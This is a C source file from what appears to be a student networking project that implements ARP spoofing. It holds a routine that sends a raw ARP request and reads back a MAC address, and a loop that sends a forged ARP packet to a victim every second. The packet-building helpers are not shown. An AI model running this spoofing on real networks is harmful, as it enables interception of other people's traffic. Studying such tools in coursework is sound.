/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by lucasg,
*/

#include "arp.h"

unsigned char *process_arp_spoofing(char *packet,
    struct sockaddr_ll *arp_sockaddr)
{
    int arp_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    char buffer[PACKET_LEN];
    ssize_t len = 0;

    if (sendto(arp_socket, packet, PACKET_LEN, 0,
               (struct sockaddr *) arp_sockaddr, sizeof(*arp_sockaddr)) < 0)
        return NULL;
    len = recv(arp_socket, buffer, PACKET_LEN, 0);
    if (len == 0)
        return NULL;
    close(arp_socket);
    return retrieve_mac_addr_from_frame(buffer);
}

void spoofing_loop(params_t *params, char *victim_addr, arp_hdr_t *arp_hdr)
{
    int spoofing_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    struct sockaddr_ll *spoofed_addr = create_spoofed_arp_socketaddr(params, victim_addr);
    char *packet = create_spoofed_packet(arp_hdr, spoofed_addr, params, victim_addr);
    ssize_t status = 0;

    while (true) {
        status = sendto(spoofing_socket, packet, PACKET_LEN, 0,
            (struct sockaddr *) spoofed_addr, sizeof(*spoofed_addr));
        if (status < 0) {
            perror("Spoofed packet: ");
            break;
        }
        printf("Spoofed packet sent to ‘%s'\n", params->dest_ip);
        sleep(1);
    }
    free(packet);
    free(spoofed_addr);
    close(spoofing_socket);
}